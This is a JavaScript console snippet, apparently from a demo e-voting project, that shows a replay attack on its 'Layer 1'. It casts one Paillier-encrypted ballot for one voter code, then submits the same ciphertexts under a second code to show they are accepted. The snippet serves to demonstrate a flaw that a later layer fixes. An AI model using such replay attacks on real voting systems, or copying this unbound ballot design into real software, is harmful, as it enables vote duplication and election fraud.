// APEX Blindfold, Layer 1 - one ballot cast twice, under two voter codes (live session of Layer 2).
//
// Open the Vote page, open the browser console, paste this whole file, press Enter.
// It builds ONE honest ballot (CHOICE) and casts it for FIRST, as any voter would. Then it casts
// the very same three ciphertexts again for SECOND: a copy, not a second ballot. Layer 1 stores the
// ciphertexts and the voter code and nothing ties one to the other, so the copy is accepted and
// counted. Whoever holds two voter codes, or reads a stored ballot on the page "What the database
// sees", can cast a vote twice, or vote the way someone else did without knowing how.
//
// The Layer 2 version of this attack is tests/snippets/replay-ballot-layer2.js.
(async () => {
  const FIRST = 'VOTER-0010'; // a registered voter code that has not voted yet: casts the honest ballot
  const SECOND = 'VOTER-0011'; // another one: casts the copy
  const CHOICE = [0, 1, 0]; // the honest ballot, for options A, B, C: here option B

  // The callback that stores a ballot exists on the Vote page only (page 1 of the application).
  const page = document.getElementById('pFlowStepId')?.value;
  if (page && page !== '1') throw new Error('Paste this on the Vote page. This page has no CAST_BALLOT callback, so nothing was sent.');

  const base = document.querySelector('script[src*="blindfold/boot.js"]').src.replace(/boot\.js.*$/, '');
  const P = await import(`${base}paillier.js`);
  const call = (name, data) => new Promise((resolve, reject) => {
    apex.server.process(name, data, { dataType: 'json', success: resolve, error: (xhr, status, message) => reject(new Error(message || status)) });
  });

  const info = await call('ELECTION_INFO', {});
  const key = P.publicKeyFromN(P.fromHex(info.n_hex));
  const ballot = CHOICE.map((m) => P.ciphertextToHex(key, P.encrypt(key, BigInt(m))));

  const first = await call('CAST_BALLOT', { x01: FIRST, f01: ballot });
  console.log(`The honest ballot [${CHOICE.join(', ')}] for ${FIRST}. The database answered:`, first);
  if (!first.ok) return { first };

  const second = await call('CAST_BALLOT', { x01: SECOND, f01: ballot });
  console.log(`The same three ciphertexts again, for ${SECOND}. The database answered:`, second);
  return { first, second };
})();
